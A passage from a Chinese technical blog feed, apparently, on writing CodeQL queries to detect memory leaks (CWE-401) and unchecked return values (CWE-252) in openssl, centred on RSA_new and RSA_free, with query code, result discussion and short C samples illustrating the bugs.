and</span><br><span class="line">    node = def</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AllocReachability</span> <span class="keyword">extends</span> <span class="title">StackVariableReachabilityExt</span> </span>&#123;</span><br><span class="line">  AllocReachability() &#123; <span class="keyword">this</span> = <span class="string">"AllocReachability"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    allocationDefinition(v, node)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(ControlFlowNode node, StackVariable v)</span> </span>&#123;</span><br><span class="line">    v.getFunction() = node.(ReturnStmt).getEnclosingFunction()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isBarrier</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    ControlFlowNode source, ControlFlowNode node, ControlFlowNode next, StackVariable v</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span> </span>&#123;</span><br><span class="line">    isSource(source, v) and</span><br><span class="line">    next = node.getASuccessor() and</span><br><span class="line">    <span class="comment">// the memory (stored in any variable `v0`) allocated at `source` is freed or</span></span><br><span class="line">    <span class="comment">// assigned to a global at node, or NULL checked on the edge node -&gt; next.</span></span><br><span class="line">    exists(StackVariable v0 | allocatedVariableReaches(v0, source, node) |</span><br><span class="line">      node.(AnalysedExpr).getNullSuccessor(v0) = next or</span><br><span class="line">      freeCallOrIndirect(node, v0) or</span><br><span class="line">      assignedToFieldOrGlobal(v0, node)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="plian-he-cha-xun">联合查询</span><a href="#plian-he-cha-xun" class="header-anchor">#</a></h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">from ControlFlowNode def, ReturnStmt ret</span><br><span class="line">where</span><br><span class="line">  allocationReaches(def, ret) and</span><br><span class="line">  not exists(StackVariable v |</span><br><span class="line">    allocatedVariableReaches(v, def, ret) and</span><br><span class="line">    ret.getAChild*() = v.getAnAccess()</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">def</span>, <span class="string">"The memory allocated here may not be released at $@."</span>, ret, <span class="string">"this exit point"</span></span><br></pre></td></tr></table></figure><p>在有了前面的铺垫后，最终的查询用自然语言描述就是：</p><ol><li>从一个控制流结点到一个返回语句可达</li><li>且不存在一个变量保存了分配的内存的指针且最后被释放或者被赋值给全局变量等，并且申请的空间也没有作为函数返回值被返回到上层函数。</li></ol><h3><span id="pfu-lu-memorymaynotbefreed-ql">附录：MemoryMayNotBeFreed.ql</span><a href="#pfu-lu-memorymaynotbefreed-ql" class="header-anchor">#</a></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name Memory may not be freed</span></span><br><span class="line"><span class="comment"> * @description A function may return before freeing memory that was allocated in the function. Freeing all memory allocated in the function before returning ties the lifetime of the memory blocks to that of the function call, making it easier to avoid and detect memory leaks.</span></span><br><span class="line"><span class="comment"> * @kind problem</span></span><br><span class="line"><span class="comment"> * @id cpp/memory-may-not-be-freed</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @tags efficiency</span></span><br><span class="line"><span class="comment"> *       security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-401</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import MemoryFreed</span><br><span class="line">import semmle.code.cpp.controlflow.StackVariableReachability</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 'call' is either a direct call to f, or a possible call to f</span></span><br><span class="line"><span class="comment"> * via a function pointer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">predicate mayCallFunction(Expr <span class="keyword">call</span>, <span class="keyword">Function</span> f) &#123;</span><br><span class="line">  call.(FunctionCall).getTarget() = f <span class="keyword">or</span></span><br><span class="line">  call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() =</span><br><span class="line">    f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate allocCallOrIndirect(Expr e) &#123;</span><br><span class="line">  // direct alloc <span class="keyword">call</span></span><br><span class="line">  e.(AllocationExpr).requiresDealloc() <span class="keyword">and</span></span><br><span class="line">  // We <span class="keyword">are</span> <span class="keyword">only</span> interested <span class="keyword">in</span> alloc calls that <span class="keyword">are</span></span><br><span class="line">  // actually freed somehow, <span class="keyword">as</span> MemoryNeverFreed</span><br><span class="line">  // will catch those that aren<span class="string">'t.</span></span><br><span class="line"><span class="string">  allocMayBeFreed(e)</span></span><br><span class="line"><span class="string">  or</span></span><br><span class="line"><span class="string">  exists(ReturnStmt rtn |</span></span><br><span class="line"><span class="string">    // indirect alloc call</span></span><br><span class="line"><span class="string">    mayCallFunction(e, rtn.getEnclosingFunction()) and</span></span><br><span class="line"><span class="string">    (</span></span><br><span class="line"><span class="string">      // return alloc</span></span><br><span class="line"><span class="string">      allocCallOrIndirect(rtn.getExpr())</span></span><br><span class="line"><span class="string">      or</span></span><br><span class="line"><span class="string">      // return variable assigned with alloc</span></span><br><span class="line"><span class="string">      exists(Variable v |</span></span><br><span class="line"><span class="string">        v = rtn.getExpr().(VariableAccess).getTarget() and</span></span><br><span class="line"><span class="string">        allocCallOrIndirect(v.getAnAssignedValue()) and</span></span><br><span class="line"><span class="string">        not assignedToFieldOrGlobal(v, _)</span></span><br><span class="line"><span class="string">      )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">  )</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * The point at which a call to '</span>realloc<span class="string">' on '</span>v<span class="string">' has been verified to</span></span><br><span class="line"><span class="string"> * succeed.  A failed realloc does *not* free the input pointer, which</span></span><br><span class="line"><span class="string"> * can cause memory leaks.</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">predicate verifiedRealloc(FunctionCall reallocCall, Variable v, ControlFlowNode verified) &#123;</span></span><br><span class="line"><span class="string">  reallocCall.(AllocationExpr).getReallocPtr() = v.getAnAccess() and</span></span><br><span class="line"><span class="string">  (</span></span><br><span class="line"><span class="string">    exists(Variable newV, ControlFlowNode node |</span></span><br><span class="line"><span class="string">      // a realloc followed by a null check at '</span>node<span class="string">' (return the non-null</span></span><br><span class="line"><span class="string">      // successor, i.e. where the realloc is confirmed to have succeeded)</span></span><br><span class="line"><span class="string">      newV.getAnAssignedValue() = reallocCall and</span></span><br><span class="line"><span class="string">      node.(AnalysedExpr).getNonNullSuccessor(newV) = verified and</span></span><br><span class="line"><span class="string">      // note: this case uses naive flow logic (getAnAssignedValue).</span></span><br><span class="line"><span class="string">      // special case: if the result of the '</span>realloc<span class="string">' is assigned to the</span></span><br><span class="line"><span class="string">      // same variable, we don'</span>t descriminate properly <span class="keyword">between</span> the <span class="keyword">old</span></span><br><span class="line">      // <span class="keyword">and</span> the <span class="keyword">new</span> allocation; better to not consider this a free at</span><br><span class="line">      // all in that case.</span><br><span class="line">      newV != v</span><br><span class="line">    )</span><br><span class="line">    or</span><br><span class="line">    // a realloc(ptr, 0), which always succeeds and frees</span><br><span class="line">    // (return the realloc itself)</span><br><span class="line">    reallocCall.(AllocationExpr).getReallocPtr().getValue() = "0" and</span><br><span class="line">    verified = reallocCall</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate freeCallOrIndirect(ControlFlowNode n, Variable v) &#123;</span><br><span class="line">  // direct free <span class="keyword">call</span></span><br><span class="line">  n.(DeallocationExpr).getFreedExpr() = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">not</span> <span class="keyword">exists</span>(n.(AllocationExpr).getReallocPtr())</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  // verified realloc <span class="keyword">call</span></span><br><span class="line">  verifiedRealloc(_, v, n)</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  <span class="keyword">exists</span>(FunctionCall midcall, <span class="keyword">Function</span> <span class="keyword">mid</span>, <span class="built_in">int</span> arg |</span><br><span class="line">    // indirect free <span class="keyword">call</span></span><br><span class="line">    n.(<span class="keyword">Call</span>).getArgument(arg) = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">    mayCallFunction(n, <span class="keyword">mid</span>) <span class="keyword">and</span></span><br><span class="line">    midcall.getEnclosingFunction() = <span class="keyword">mid</span> <span class="keyword">and</span></span><br><span class="line">    freeCallOrIndirect(midcall, mid.getParameter(arg))</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate allocationDefinition(StackVariable v, ControlFlowNode <span class="keyword">def</span>) &#123;</span><br><span class="line">  <span class="keyword">exists</span>(Expr expr | exprDefinition(v, <span class="keyword">def</span>, expr) <span class="keyword">and</span> allocCallOrIndirect(expr))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> AllocVariableReachability extends StackVariableReachabilityWithReassignment &#123;</span><br><span class="line">  AllocVariableReachability() &#123; this = <span class="string">"AllocVariableReachability"</span> &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSourceActual(ControlFlowNode node, StackVariable v) &#123;</span><br><span class="line">    allocationDefinition(v, node)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSinkActual(ControlFlowNode node, StackVariable v) &#123;</span><br><span class="line">    // node may be used <span class="keyword">in</span> allocationReaches</span><br><span class="line">    <span class="keyword">exists</span>(node.(AnalysedExpr).getNullSuccessor(v)) <span class="keyword">or</span></span><br><span class="line">    freeCallOrIndirect(node, v) <span class="keyword">or</span></span><br><span class="line">    assignedToFieldOrGlobal(v, node) <span class="keyword">or</span></span><br><span class="line">    // node may be used directly <span class="keyword">in</span> <span class="keyword">query</span></span><br><span class="line">    v.getFunction() = node.(ReturnStmt).getEnclosingFunction()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isBarrier(ControlFlowNode node, StackVariable v) &#123; definitionBarrier(v, node) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The value from allocation `def` is still held in Variable `v` upon entering `node`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">predicate allocatedVariableReaches(StackVariable v, ControlFlowNode <span class="keyword">def</span>, ControlFlowNode node) &#123;</span><br><span class="line">  <span class="keyword">exists</span>(AllocVariableReachability r |</span><br><span class="line">    // reachability</span><br><span class="line">    r.reachesTo(<span class="keyword">def</span>, _, node, v)</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    // <span class="keyword">accept</span> <span class="keyword">def</span> node itself</span><br><span class="line">    r.isSource(<span class="keyword">def</span>, v) <span class="keyword">and</span></span><br><span class="line">    node = <span class="keyword">def</span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> AllocReachability extends StackVariableReachabilityExt &#123;</span><br><span class="line">  AllocReachability() &#123; this = <span class="string">"AllocReachability"</span> &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(ControlFlowNode node, StackVariable v) &#123;</span><br><span class="line">    allocationDefinition(v, node)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(ControlFlowNode node, StackVariable v) &#123;</span><br><span class="line">    v.getFunction() = node.(ReturnStmt).getEnclosingFunction()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isBarrier(</span><br><span class="line">    ControlFlowNode <span class="keyword">source</span>, ControlFlowNode node, ControlFlowNode <span class="keyword">next</span>, StackVariable v</span><br><span class="line">  ) &#123;</span><br><span class="line">    isSource(<span class="keyword">source</span>, v) <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">next</span> = node.getASuccessor() <span class="keyword">and</span></span><br><span class="line">    // the <span class="keyword">memory</span> (<span class="keyword">stored</span> <span class="keyword">in</span> <span class="keyword">any</span> <span class="keyword">variable</span> <span class="string">`v0`</span>) allocated <span class="keyword">at</span> <span class="string">`source`</span> <span class="keyword">is</span> freed <span class="keyword">or</span></span><br><span class="line">    // assigned <span class="keyword">to</span> a <span class="keyword">global</span> <span class="keyword">at</span> node, <span class="keyword">or</span> <span class="literal">NULL</span> checked <span class="keyword">on</span> the edge node -&gt; next.</span><br><span class="line">    <span class="keyword">exists</span>(StackVariable v0 | allocatedVariableReaches(v0, <span class="keyword">source</span>, node) |</span><br><span class="line">      node.(AnalysedExpr).getNullSuccessor(v0) = <span class="keyword">next</span> <span class="keyword">or</span></span><br><span class="line">      freeCallOrIndirect(node, v0) <span class="keyword">or</span></span><br><span class="line">      assignedToFieldOrGlobal(v0, node)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The value returned by allocation `def` has not been freed, confirmed to be null,</span></span><br><span class="line"><span class="comment"> * or potentially leaked globally upon reaching `node`  (regardless of what variable</span></span><br><span class="line"><span class="comment"> * it's still held in, if any).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">predicate allocationReaches(ControlFlowNode <span class="keyword">def</span>, ControlFlowNode node) &#123;</span><br><span class="line">  <span class="keyword">exists</span>(AllocReachability r | r.reaches(<span class="keyword">def</span>, _, node))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate assignedToFieldOrGlobal(StackVariable v, Expr e) &#123;</span><br><span class="line">  // assigned <span class="keyword">to</span> anything <span class="keyword">except</span> a StackVariable</span><br><span class="line">  // (typically a <span class="keyword">field</span> <span class="keyword">or</span> <span class="keyword">global</span>, but <span class="keyword">for</span> example also *ptr = v)</span><br><span class="line">  e.(Assignment).getRValue() = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">not</span> e.(Assignment).getLValue().(VariableAccess).getTarget() instanceof StackVariable</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  <span class="keyword">exists</span>(Expr midExpr, <span class="keyword">Function</span> <span class="keyword">mid</span>, <span class="built_in">int</span> arg |</span><br><span class="line">    // indirect assignment</span><br><span class="line">    e.(FunctionCall).getArgument(arg) = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">    mayCallFunction(e, <span class="keyword">mid</span>) <span class="keyword">and</span></span><br><span class="line">    midExpr.getEnclosingFunction() = <span class="keyword">mid</span> <span class="keyword">and</span></span><br><span class="line">    assignedToFieldOrGlobal(mid.getParameter(arg), midExpr)</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  // assigned <span class="keyword">to</span> a <span class="keyword">field</span> via <span class="keyword">constructor</span> <span class="keyword">field</span> initializer</span><br><span class="line">  e.(ConstructorFieldInit).getExpr() = v.getAnAccess()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ControlFlowNode <span class="keyword">def</span>, ReturnStmt ret</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  allocationReaches(<span class="keyword">def</span>, ret) <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">not</span> <span class="keyword">exists</span>(StackVariable v |</span><br><span class="line">    allocatedVariableReaches(v, <span class="keyword">def</span>, ret) <span class="keyword">and</span></span><br><span class="line">    ret.getAChild*() = v.getAnAccess()</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">def</span>, <span class="string">"The memory allocated here may not be released at $@."</span>, ret, <span class="string">"this exit point"</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>research</category>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL之CWE-401(1)</title>
    <url>/81db1c47.html</url>
    <content><![CDATA[<blockquote><p>The software does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory.</p></blockquote><a id="more"></a><h3><span id="pjie-shao">介绍</span><a href="#pjie-shao" class="header-anchor">#</a></h3><p><code>CWE-401</code>，其实也就是内存漏释放的情况，一般来说我们在代码中使用<code>malloc</code>、<code>new</code>申请的内存，都需要被释放才行，否则就会出现<code>memory leak</code>等问题</p><p>在用<code>codeql</code>找这类漏洞时，可以分为两种情况，第一种是内存申请后，完全没有释放，比如下面的情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *buff = <span class="built_in">malloc</span>(SIZE * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">int</span> status = <span class="number">0</span>;</span><br><span class="line">	... <span class="comment">//code that does not free buff</span></span><br><span class="line">	<span class="keyword">return</span> status; <span class="comment">//buff is never closed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种是有的路径释放了，而有的路径上没有释放，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> *buff = <span class="built_in">malloc</span>(SIZE*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		do_stuff(buff);</span><br><span class="line">		<span class="keyword">return</span> buff;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (<span class="keyword">int</span> do_stuff_exception) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">//returns NULL on error, but does not free memory</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到如果正常进行，会进行释放，如果出现了错误，在错误处理环节并没有释放。</p><p>之所以分为两类，因为在写查询脚本的时候，是有所区别的，本次只先将第一类</p><h3><span id="p"></span><a href="#p" class="header-anchor">#</a></h3><p>第一类比较简单，还是以<code>openssl</code>的<code>RSA_new</code>为例</p><h3><span id="psi-lu-1">思路1</span><a href="#psi-lu-1" class="header-anchor">#</a></h3><p>思路1还是从我们已知的API标出发。</p><p>假设我们有一条先验知识——所有使用<code>RSA_new</code>分配的内存空间，都需要调用<code>RSA_free</code>释放。</p><p>首先我们来康康一共有多少<code>RSA_new</code>（因为用最新的codeql和openssl重新编译了）</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">predicate check_name(Function func) &#123; func.getName().matches("RSA_new") &#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall func</span><br><span class="line">where check_name(func.getTarget())</span><br><span class="line"><span class="keyword">select</span> func,func.getLocation()</span><br></pre></td></tr></table></figure><p>没有任何意外，还是17处</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-13-114306.png" alt="image-20201113194306329"></p><p>我们其实还是选择在同一个函数内做一个数据流分析，思路上很清晰，<code>source</code>点是对<code>RSA_new</code>函数的调用，<code>sink</code>点我们没法直接定到函数，但是我们可以知道<code>sink</code>点是<code>RSA_free</code>函数的一个参数，所以我们可以直接写出下面的查询语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">predicate check_name_pre(Function func) &#123; func.getName().matches("RSA_new") &#125;</span><br><span class="line"></span><br><span class="line">predicate check_name_post(Function func) &#123;func.getName().matches("RSA_free")&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node source,DataFlow::Node sink,FunctionCall fc</span><br><span class="line">where </span><br><span class="line">exists( |</span><br><span class="line">  DataFlow::localFlow(source, sink) and</span><br><span class="line">  source.asExpr() instanceof FunctionCall and</span><br><span class="line">  check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">  check_name_post(fc.getTarget()) and</span><br><span class="line">  fc.getAnArgument()=sink.asExpr()</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> source.asExpr(),source.asExpr().getLocation()</span><br></pre></td></tr></table></figure><p>结果是有14个<code>RSA_new</code>存在对应的<code>RSA_free</code></p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-13-114857.png" alt="image-20201113194857126"></p><p>也就是所有的17个结果中的<code>1、3、17</code>没有进行<code>free</code></p><p>第一个同样也是误报，原因和之前那个一样，<code>codeql</code>没有正确的识别出<code>loopargs[i].rsa_key[testnum]</code>的所有<code>sink</code>点。</p><p>第二个也是误报如下，原因在于我们只看了函数内的数据流关系，<code>pval</code>是函数指针形式传进来的，它在全局数据流上，还是存在释放的，这也提醒我们，在函数内找这类漏洞时，为了避免误报，应该先忽略掉这么两类情况：</p><ul><li>第一类：申请后的内存给了函数参数</li><li>第二类：申请后的内存指针，通过<code>return</code>传给了调用它的函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rsa_cb</span><span class="params">(<span class="keyword">int</span> operation, ASN1_VALUE **pval, <span class="keyword">const</span> ASN1_ITEM *it,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">void</span> *exarg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (operation == ASN1_OP_NEW_PRE) &#123;</span><br><span class="line">        *pval = (ASN1_VALUE *)RSA_new();</span><br><span class="line">        <span class="keyword">if</span> (*pval != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operation == ASN1_OP_FREE_PRE) &#123;</span><br><span class="line">        RSA_free((RSA *)*pval);</span><br><span class="line">        *pval = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operation == ASN1_OP_D2I_POST) &#123;</span><br><span class="line">        <span class="keyword">if</span> (((RSA *)*pval)-&gt;version != RSA_ASN1_VERSION_MULTI) &#123;</span><br><span class="line">            <span class="comment">/* not a multi-prime key, skip */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (rsa_multip_calc_product((RSA *)*pval) == <span class="number">1</span>) ? <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个是我们的老朋友了，还是上次找到的<code>Missing Check</code>的地方，不过和第二个一样，同样也是一个误报</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rsa_setkey</span><span class="params">(RSA** key, <span class="keyword">unsigned</span> <span class="keyword">char</span>* ctext, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> clen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *key = RSA_new();</span><br><span class="line">    <span class="keyword">if</span> (*key != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">switch</span> (idx) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            clen = key1(*key, ctext);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            clen = key2(*key, ctext);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            clen = key3(*key, ctext);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> clen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="psi-lu-2">思路2</span><a href="#psi-lu-2" class="header-anchor">#</a></h3><p>思路2依旧是基于统计的方法，稍微改改脚本就行</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">predicate check_name_pre(Function func) &#123; func.getName().matches("RSA_new") &#125;</span><br><span class="line"></span><br><span class="line">predicate check_name_post(Function func) &#123;func.getName().matches("RSA_free")&#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall func,int total,int freed,DataFlow::Node sc,DataFlow::Node sk</span><br><span class="line">where </span><br><span class="line">total = count(FunctionCall fc_pre | check_name_pre(fc_pre.getTarget())) and</span><br><span class="line">freed = count(DataFlow::Node source | </span><br><span class="line">  exists(DataFlow::Node sink,FunctionCall fc_post|</span><br><span class="line">  DataFlow::localFlow(source, sink) and</span><br><span class="line">  source.asExpr() instanceof FunctionCall and</span><br><span class="line">  check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">  check_name_post(fc_post.getTarget()) and</span><br><span class="line">  fc_post.getAnArgument()=sink.asExpr()</span><br><span class="line">  )) and</span><br><span class="line">freed!=total and</span><br><span class="line">freed*100/total &gt; 80 and</span><br><span class="line">exists(|</span><br><span class="line">  DataFlow::localFlow(sc, sk) and</span><br><span class="line">  sc.asExpr() instanceof FunctionCall and</span><br><span class="line">  check_name_pre(sc.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">  check_name_post(func.getTarget()) and</span><br><span class="line">  func.getAnArgument()=sk.asExpr()</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">select</span> sc.asExpr(),sc.asExpr().getLocation(),total,freed</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-14-013635.png" alt="image-20201114093555826"></p><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>总结来说，对于<code>CWE-401</code>，在函数内部进行查找的时候，需要去掉函数参数，返回值这两类情况，感兴趣的小伙伴可以继续修改，把这两类情况加入查询脚本，进一步降低误报率。</p><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><a href="https://cwe.mitre.org/data/definitions/401.html">CWE-401</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL之CWE-252</title>
    <url>/3f2f6cef.html</url>
    <content><![CDATA[<blockquote><p>CWE-252: Unchecked Return Value</p><p>The software does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.</p></blockquote><p>顾名思义，<code>Unchecked Return Value</code>，就是在实际代码中缺少了对返回值的检查，在实际代码中，对错误返回值的检查尤为重要，因为需要进入到相应的错误处理环节中去，否则会影响程序的正常运行。比如我们常见的对<code>malloc</code>返回值的检查等等，和<code>CWE-252</code>相关的还有<code>CWE-754</code>、<code>CWE-273</code>、<code>CWE-476</code></p><a id="more"></a><p><strong>PS</strong>：我们以<code>openssl</code>为例进行相应的CodeQL查询脚本的编写</p><p>我们要找的是缺少对函数返回值的检查的情况，但首先我们要知道哪些函数的返回值是需要进行检查的。</p><p>可以想到的有以下两种方法：</p><ul><li><p>思路1：我们可以从文档的描述里知道某个函数的返回值是需要进行检查的，例如<code>openssl文档中</code>，我们通过下面的描述知道<code>RSA_new</code>在返回NULL的时候是出现了错误，因此需要进行检查</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If the allocation fails, RSA_new() returns NULL and sets an error code that can be obtained by ERR_get_error(3). Otherwise it returns a pointer to the newly allocated structure.</span><br></pre></td></tr></table></figure></li><li><p>思路2：当一个函数，在项目中被多次使用，大部分都检查了返回值，那么这个函数的返回值大概率是要被检查的，而没检查的地方就是<code>Unchecked Return Value</code></p></li></ul><p>以<code>RSA_new</code>为例，我们先看看它有没有忘检查返回值的情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">predicate check_name(Function func) &#123; func.getName().matches("RSA_new") &#125;</span><br><span class="line"></span><br><span class="line">from FunctionCall func</span><br><span class="line">where check_name(func.getTarget())</span><br><span class="line"><span class="keyword">select</span> func,func.getLocation()</span><br></pre></td></tr></table></figure><p>可以看到有17个地方使用了<code>RSA_new</code>，其中16个地方，有的直接用<code>IF</code>判断是否为<code>NULL</code>，有的使用<code>TEST_ptr</code>判断是否是<code>NULL</code>，只有最后一处，在<code>openssl</code>的测试代码里，忘记了检查</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-12-094204.jpg" alt="image-20201112153302685"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rsa_setkey</span><span class="params">(RSA** key, <span class="keyword">unsigned</span> <span class="keyword">char</span>* ctext, <span 